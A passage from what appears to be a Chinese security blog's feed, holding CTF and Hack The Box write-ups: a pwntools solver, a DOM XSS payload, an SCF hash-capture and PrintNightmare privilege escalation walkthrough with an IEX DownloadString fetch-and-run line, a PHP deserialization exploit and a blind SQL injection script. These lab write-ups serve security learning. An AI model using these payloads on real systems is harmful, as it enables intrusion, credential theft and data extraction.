class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_condition1</span>(<span class="params">source, source_encoded</span>):</span></span><br><span class="line">    brute_str = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> brute_str:</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> brute_str:</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> brute_str:</span><br><span class="line">            <span class="keyword">for</span> j2 <span class="keyword">in</span> brute_str:</span><br><span class="line">                res = i + j + i2 + j2 + source</span><br><span class="line">                res_encode = sha256(res.encode()).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> res_encode == source_encoded:</span><br><span class="line">                    <span class="keyword">return</span> res[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_condition2</span>(<span class="params">nth</span>):</span></span><br><span class="line">    n = <span class="number">4</span> * nth</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    i = <span class="number">777</span></span><br><span class="line">    s = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29126</span>)</span><br><span class="line"></span><br><span class="line">    data = s.recvline()</span><br><span class="line">    source_string = re.findall(<span class="string">r&#x27;\(\S+\+(\S+)\)&#x27;</span>, <span class="built_in">str</span>(data))[<span class="number">0</span>]</span><br><span class="line">    encoded_string = re.findall(<span class="string">r&#x27;= ([0-9a-fA-F]*)\\&#x27;</span>, <span class="built_in">str</span>(data))[<span class="number">0</span>]</span><br><span class="line">    phase_1 = crack_condition1(source_string, encoded_string)</span><br><span class="line">    s.sendline(phase_1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i:</span><br><span class="line">        data = s.recvline()</span><br><span class="line">        phase2_nth = re.findall(<span class="string">r&#x27;the (\d*)th&#x27;</span>, <span class="built_in">str</span>(data))[<span class="number">0</span>]</span><br><span class="line">        phase_2 = crack_condition2(<span class="built_in">int</span>(phase2_nth))</span><br><span class="line">        s.sendline(<span class="built_in">str</span>(phase_2))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            res = s.recvline()</span><br><span class="line">            res = s.recvline()</span><br><span class="line">            res = s.recvline()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res = s.recvline()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ol><li>python3中的str类与bytes类已经被区分开了，如果将bytes类强行转换为str类，那么将会多出<code>b&#39;&#39;</code>这三个字符。</li><li>关于python3中的正则表达式可以参考<a href="https://docs.python.org/3/library/re.html#regular-expression-syntax">官方链接</a></li><li>pwntools的使用参考此<a href="https://github.com/Gallopsled/pwntools-tutorial">链接</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> VNCTF </category>
          
          <category> 2022 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python脚本编写 </tag>
            
            <tag> 哈希加密 </tag>
            
            <tag> 正则匹配 </tag>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习</title>
      <link href="/2022/02/13/xss/"/>
      <url>/2022/02/13/xss/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>此篇文章会介绍有关XSS的知识，但不会讲解基础原理，而是根据例子介绍一些绕过及防御措施。此外，文章结尾会列出一些介绍XSS或者补充本文章内容的链接，方便进行查阅。</p><h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><h3 id="DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="DOM XSS in jQuery selector sink using a hashchange event"></a>DOM XSS in jQuery selector sink using a hashchange event</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="built_in">window</span>).on(<span class="string">&#x27;hashchange&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="built_in">decodeURIComponent</span>(<span class="built_in">window</span>.location.hash.slice(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (post) post.get(<span class="number">0</span>).scrollIntoView();</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>该script的作用基本上是自动滑动到指定的文章 ，依据的是页面的标签值<code>/#admin</code>，当<code>window.location.hash</code>值改变时会调用该函数。<br><code>h2:contains</code>代表查找h2标签中具有特定值的元素。<br>payload:<code>https://website.com/#&lt;img src=d onerror=print()&gt;</code>，直接报错执行，直接插入JavaScript语句不会正常执行。</p><h1 id="补充链接"><a href="#补充链接" class="headerlink" title="补充链接"></a>补充链接</h1><p><a href="https://www.fooying.com/the-art-of-xss-1-introduction/#mxss">XSS类型详细介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础原理 </category>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> OWASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Driver</title>
      <link href="/2022/02/10/HTB-Driver/"/>
      <url>/2022/02/10/HTB-Driver/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前玩的都是Linux类型的靶机，今天就打一个Windows类型的靶机吧，希望可以学习一些渗透Windows系统的知识。</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><code>sudo nmap -A -sS -sC -sV -p- --min-rate 5000 10.10.11.106</code>扫描端口及服务。</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>端口信息</span></div>    <div class="hide-content"><p>Nmap scan report for 10.10.11.106<br>Host is up (0.72s latency).<br>Not shown: 65531 filtered ports<br>PORT     STATE SERVICE      VERSION<br>80/tcp   open  http         Microsoft IIS httpd 10.0<br>| http-auth:<br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Basic realm=MFP Firmware Update Center. Please enter password for admin<br>| http-methods:<br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Site doesn’t have a title (text/html; charset=UTF-8).<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose|specialized<br>Running (JUST GUESSING): Microsoft Windows 2008|10|7|Vista (90%)<br>OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1<br>Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 10 1511 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows Vista SP2 (85%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</p><p>Host script results:<br>|<em>clock-skew: mean: 7h17m25s, deviation: 0s, median: 7h17m25s<br>| smb-security-mode:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|</em>  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode:<br>|   2.02:<br>|_    Message signing enabled but not required<br>| smb2-time:<br>|   date: 2022-02-12T16:46:31<br>|_  start_date: 2022-02-11T22:12:07</p></div></div><div class="note info simple"><p>nmap扫描要注意参数，否则不会检查到部分开放的端口。</p></div><p>WinRM（Windows Remote Management）服务能够让管理员远程登录Windows操作系统，获得一个可交互的shell，底层通讯协议使用的是HTTP。</p><h1 id="普通用户权限"><a href="#普通用户权限" class="headerlink" title="普通用户权限"></a>普通用户权限</h1><p>发现开启了http服务，访问时要求输入账号和密码，猜测为弱口令输入账号<code>admin</code>密码<code>admin</code>登录成功。果然与题目名称对应<mark class="hl-label blue">Driver</mark> ，是一个管理打印机的后台界面。<br>后台界面发现一个文件上传点，尝试上传php类型的shell，但是找不到访问上传文件的路径，目录扫描也没发现什么有趣的东西，参考别人的wp才知道可以利用SMB协议（445端口）相关漏洞。</p><h2 id="SMB简单介绍"><a href="#SMB简单介绍" class="headerlink" title="SMB简单介绍"></a>SMB简单介绍</h2><p>smb（server message block）是微软用来让局域网内的Windows主机共享文件和打印服务而创建的基于Client/Server模型的协议，人们有时将其与CIFS（Common Internet File System）交替的进行讨论，两者功能相同。<br>Samba是为了让类Unix系统与Windows系统之间可以共享文件和打印机而开发的一个软件。<br><a href="https://thecyphere.com/blog/smb-port/#:~:text=Simply%20put%2C%20port%20445%20is%20used%20for%20file,TCP%20and%20UDP%20protocols%20for%20several%20Microsoft%20services.">补充</a></p><h2 id="SCF文件攻击"><a href="#SCF文件攻击" class="headerlink" title="SCF文件攻击"></a>SCF文件攻击</h2><p>SCF(shell command files)可以用来执行一些有限的操作，比如显示Windows桌面、打开Windows浏览器，除此之外，SCF文件可以用来访问特定的UNC路径。当用户浏览该文件时会自动执行里面的命令，在文件名前面加上@符号，可以将该文件显示在共享设备的最顶部。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.10\share\wuoo.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><p>命名为<code>@whoami.scf</code>，通过上传点上传文件。<br>当用户浏览该文件后，会自动地与SCF文件UNC路径所代表的主机建立连接，并且Windows为了验证对该共享资源的访问权会发送自己的账号以及经过哈希加密之后的密码（NTLMv2 hash）。<br><code>responder -wrf --lm -v -I tun0 </code>命令用来捕获发送过来的哈希。<br><img src="https://s2.loli.net/2022/02/12/zjqsOMK68S1LmAc.png" alt="image.png"><br>这里作者上传了好多次文件才最终收到了hash，有可能是多用户共用一个靶机的原因。<br>该漏洞详细信息参考这篇文章：<a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">英文</a> <a href="https://zhuanlan.zhihu.com/p/32248261">中文</a><br>使用hashcat来进行破解,<code>hashcat -a 0 -m 5600 hash_to_crack /usr/share/wordlists/rockyou.txt --force</code><br><img src="https://s2.loli.net/2022/02/10/ypNdG8cKY5f9jvk.png" alt="image.png"><br>账号：tony<br>密码：liltony</p><h1 id="root权限获取"><a href="#root权限获取" class="headerlink" title="root权限获取"></a>root权限获取</h1><p><code>evil-winrm -i 10.10.11.106 -u tony -p liltony</code>以shell环境登录到Windows主机，输入前面获得的账号和密码进行登录。<br><code>tasklist</code>无法正常运行，那么使用<code>get-process</code>获取当前运行进程信息。<br>发现运行了<code>spoolsv</code>程序，经过搜索发现存在PrintNightmare<a href="https://github.com/calebstewart/CVE-2021-1675">CVE</a>漏洞。<br><code>IEX (New-Object Net.WebClient).DownloadString(&#39;#&#123;remote_script&#125;&#39;); </code>将远程的脚本加载到内存中，避免了下载脚本后再使用<code>Import-Module</code>导入到内存中。<br><code>Invoke-Nightmare -NewUser &quot;wiil&quot; -NewPassword &quot;whtt&quot; </code>创建拥有管理员权限的用户wiil。<br>可以使用自己特制的dll，这里作者能力有限就不加介绍了。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> Hackthebox </category>
          
          <category> easy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> smb协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 青龙组-AreUSerialz1</title>
      <link href="/2022/02/10/AreUSerialz/"/>
      <url>/2022/02/10/AreUSerialz/</url>
      
        <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>通过查看源代码，如果想要获得flag，我们需要做以下几件事：</p><ol><li>更改<code>protected</code>变量的值</li><li>调用read成员函数读取文件</li><li>修改读取文件为flag文件</li><li>绕过<code>__destruct</code>魔术方法</li><li>绕过<code>is_valid</code>方法</li></ol><p>序列化的大致原理是将类中的属性转换为字符串，方便在web上进行传输，更详细的介绍可以参考这个<a href="https://www.cnblogs.com/youyoui/p/8610068.html">链接</a>。<br>protected属性在序列化时会出现阶段字符，也就是ASCII码中值为0的字符。但是<code>is_valid</code>方法只允许[32,125]范围内的字符，所以我们需要对其进行绕过。<br><code>string(121) &quot;O:11:\&quot;FileHandler\&quot;:3:&#123;s:5:\&quot;\0*\0op\&quot;;i:2;s:11:\&quot;\0*\0filename\&quot;;s:8:\&quot;flag.php\&quot;;s:10:\&quot;\0*\0content\&quot;;s:5:\&quot;hello\&quot;;&#125;&quot;</code>其中<code>\0</code>则为截断字符，正常输出是不会在窗口中显示出来的，需要进行转义。<br>可以采用如下两种方法进行绕过：</p><ul><li>PHP7.1+版本对属性类型不敏感，所以可以使用不存在特殊字符的public属性进行序列化，private属性同样存在截断字符。三者区别可以参考这个<a href="https://blog.csdn.net/Xxy605/article/details/117336343">链接</a>。</li><li>将小写的s类型变为大写的S，表示可以在字符串中用十六进制格式表示字符。我们便可以将截断字符表示为<code>\00</code>，需要注意的是字符串长度不变，也就是这三个字符代表一个截断字符。</li></ul><p>上面我们可以对属性进行赋值了，接下来要做的是绕过__destruct。__destruct中为强类型比较，也就是在比较数值前会先比较数据类型，如果数据类型不相等则为false。但是在<code>process</code>方法中为弱类型比较，如果等号两边数据类型不同，则会进行数据类型的转换，字符串类型的数据会转换为整数型的数据。<br>但这个规则在<code>PHP8.0</code>中发生了变化，详细的请看这个<a href="https://blog.csdn.net/wsfgrdgh/article/details/113986125">链接</a>。<br>这样我们可以将op变量赋值为整数型数值2，这样便不会进入__destruct的条件中。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line">    <span class="keyword">echo</span>(serialize(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:5:&quot;Hello&quot;;&#125;</code><br>使用上面的exp后，可以在网页的源代码中找到flag，因为输出的内容为php代码，所以浏览器不会显示在页面中。如果想要显示在页面中，可以使用php伪协议进行base64编码后输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line">    <span class="keyword">echo</span>(serialize(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> 小比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
            <tag> php伪协议 </tag>
            
            <tag> php强类型比较 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-HackWorld</title>
      <link href="/2022/02/08/World/"/>
      <url>/2022/02/08/World/</url>
      
        <content type="html"><![CDATA[<h1 id="题目审计"><a href="#题目审计" class="headerlink" title="题目审计"></a>题目审计</h1><p><img src="https://s2.loli.net/2022/02/09/dOTQpmVL1o6G8SX.png" alt="image.png"><br>题目告诉我们答案在<strong>flag表</strong>中的<strong>flag列</strong>，接下来我们要做的就是看看过滤了哪些字符，然后想办法获取数据。</p><h1 id="过滤的字符"><a href="#过滤的字符" class="headerlink" title="过滤的字符"></a>过滤的字符</h1><p>可以直接使用burpsuite来进行fuzz，这里作者采用编写python脚本来进行fuzz。</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>fuzz脚本</span></div>    <div class="hide-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> NONE</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payload_list = []</span><br><span class="line">valid_payload = []</span><br><span class="line">url = <span class="string">&quot;http://2cbe5bdd-ba44-4105-9f29-00d6712a52d0.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">dict_file = <span class="string">&quot;C:\\Users\\stw\\Desktop\\dict.txt&quot;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(dict_file)</span><br><span class="line">payload_list  =f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload_list)):</span><br><span class="line">    payload_list[i] = payload_list[i][:-<span class="number">1</span>] <span class="comment"># 去掉每个字符串结尾的换行符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">    r = requests.post(url=url, data=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line">    res = re.search(<span class="string">&#x27;SQL Injection Checked.&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        valid_payload.append(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(valid_payload)</span><br></pre></td></tr></table></figure></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>未过滤的字符</span></div>    <div class="hide-content"><p>[‘+’, ‘likeLiKe’, ‘sleepSLEEp’, ‘databaseDATABASe’, ‘delete’, ‘having’, ‘oroR’, ‘asAs’, ‘-~’, ‘BENCHMARK’, ‘limitLimIt’, ‘leftLeft’, ‘selectSELECT’, ‘insertinsERTINSERT’, ‘right’, ‘#’, ‘–’, ‘;’, ‘!’, ‘%’, ‘+’, ‘&lt;&gt;’, ‘(‘, ‘&gt;’, ‘&lt;’, ‘)’, ‘.’, ‘^’, ‘=’, ‘ANDANd’, ‘BYBy’, ‘CAST’, ‘COLUMNCOlumn’, ‘COUNTCount’, ‘CREATE’, ‘END’, ‘case’, “‘1’=’1”, ‘when’, “admin’”, ‘“‘, ‘+’, ‘REVERSE’, ‘’, ‘asciiASSICASSic’, ‘database’, ‘left’, ‘right’, ‘unionUNIonUNION’, ‘“‘, ‘&amp;’, ‘&amp;&amp;’, ‘||’, ‘/‘,<br>‘//‘, ‘<em>/</em>‘, ‘GROUP’, ‘HAVING’, ‘IF’, ‘INTO’, ‘JOIN’, ‘LEAVE’, ‘LEFT’, ‘LEVEL’, ‘sleep’, ‘LIKE’, ‘NAMES’, ‘NEXT’, ‘NULL’, ‘OF’, ‘ON’, ‘|’, ‘infromation_schema’, ‘user’, ‘OR’, ‘ORDER’, ‘ORD’, ‘SCHEMA’, ‘SELECT’, ‘SET’, ‘TABLE’, ‘THEN’, ‘UNION’, ‘UPDATE’, ‘USER’, ‘USING’, ‘VALUE’, ‘VALUES’, ‘WHEN’, ‘WHERE’, ‘ADD’, ‘AND’, ‘prepare’, ‘set’, ‘update’, ‘delete’, ‘drop’, ‘inset’, ‘CAST’, ‘COLUMN’, ‘CONCAT’, ‘GROUP_CONCAT’, ‘group_concat’, ‘CREATE’, ‘DATABASE’, ‘DATABASES’, ‘alter’,<br>‘DELETE’, ‘DROP’, ‘TABLE_SCHEMA’, ‘%df’, ‘concat_ws()’, ‘concat’, ‘LIMIT’, ‘ORD’, ‘ON’, ‘extractvalue’, ‘CAST()’, ‘by’,<br>‘ORDER’, ‘OUTFILE’, ‘RENAME’, ‘REPLACE’, ‘SCHEMA’, ‘SELECT’, ‘SET’, ‘updatexml’, ‘SHOW’, ‘SQL’, ‘TABLE’, ‘THEN’, ‘TRUE’, ‘instr’, ‘benchmark’, ‘bin’, ‘substring’, ‘ord’, ‘’, ‘UPDATE’, ‘VALUES’, ‘VARCHAR’, ‘VERSION’, ‘WHEN’, ‘WHERE’, ‘`’, ‘<br> ‘, ‘,’, ‘users’, ‘%0a%0A’, ‘%0b’, ‘mid’, ‘REGEXP’, ‘RLIKE’, ‘in’, ‘sys.schema_table_statistics_with_buffer’, ‘INFILE’,<br>‘count’, ‘%0c’, ‘from’, ‘%0d’, ‘%a0’, ‘=’, ‘@’, ‘else%27%23%22%2’]</p></div></div><h1 id="进行绕过"><a href="#进行绕过" class="headerlink" title="进行绕过"></a>进行绕过</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>SQL注入中如果禁用了空格，那么可以使用如下两种方法进行绕过：</p><ol><li><code>/**/</code>注释符绕过</li><li><code>()</code>括号子查询绕过<br>由于注释符被过滤，所以只能采用括号进行绕过。<br>在mysql中括号一般用来包围子查询或者查询条件，可是括号的作用不止这些，只要是返回结果的语句都可以用括号围起来，并且不需要空格来与其他部分分隔开。<br><img src="https://s2.loli.net/2022/02/09/dYDXMFHgoAUBvkb.png" alt="image.png"></li></ol><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p>当输入<code>1</code>时会返回<code>Hello, glzjin wants a girlfriend.</code> 输入其他的值则不会返回，并且不会返回详细的错误信息。<br>那么就可以知道这基本上就是一个布尔盲注了。在我们进行一个一个的字符比较时，如果相等则会返回1,否则返回0，利用这一点编写脚本。<br>其次该程序没有过滤掉<code>ascii</code>和<code>mid</code>函数，我们就可以利用这两个函数来进行比较。<br>整体思路如下所示：</p><ul><li>布尔盲注，按顺序的进行字符比较</li><li>服务器返回<code>Hello, glzjin wants a girlfriend.</code>则证明字符相等。</li></ul><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>exp</span></div>    <div class="hide-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> NONE</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeBasedBlindInject</span>(<span class="params">url</span>):</span></span><br><span class="line">    sql_dict = string.printable</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        <span class="keyword">for</span> ascii_string <span class="keyword">in</span> sql_dict:</span><br><span class="line">            data = <span class="string">f&#x27;(select(ascii(mid(flag,<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(ascii_string)&#125;</span>)from(flag))&#x27;</span></span><br><span class="line">            data = &#123;<span class="string">&quot;id&quot;</span>: data&#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span>, r.text):</span><br><span class="line">                res = res + ascii_string</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://15314337-d129-4e59-a6c1-81088d3c5c92.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">timeBasedBlindInject(url)</span><br></pre></td></tr></table></figure></div></div><p>最后查看程序输出即可得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> ciscn </category>
          
          <category> 2019 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn2019 </tag>
            
            <tag> sql盲注 </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Pandora</title>
      <link href="/2022/01/29/HTB-Pandora/"/>
      <url>/2022/01/29/HTB-Pandora/</url>
      
